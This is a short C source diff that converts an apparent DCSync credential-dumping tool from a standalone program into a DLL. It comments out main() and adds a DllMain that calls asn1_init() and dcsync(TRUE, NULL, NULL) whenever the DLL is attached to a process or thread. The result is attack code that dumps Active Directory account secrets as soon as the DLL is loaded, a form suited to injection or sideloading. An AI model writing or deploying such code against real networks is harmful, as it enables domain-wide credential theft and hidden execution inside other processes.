@@ -273,10 +273,28 @@ int dcsync(BOOL allData, LPCWSTR szUser, LPCWSTR szGuid)
 	return 1;
 }
 
+/*
 int main(int argc, wchar_t* argv[])
 {
 	asn1_init();
 	dcsync(TRUE, NULL, NULL);
 
 }
-
+*/
+BOOL APIENTRY DllMain(HMODULE hModule,
+	DWORD  ul_reason_for_call,
+	LPVOID lpReserved
+)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+	case DLL_THREAD_ATTACH:
+		asn1_init();
+		dcsync(TRUE, NULL, NULL);
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
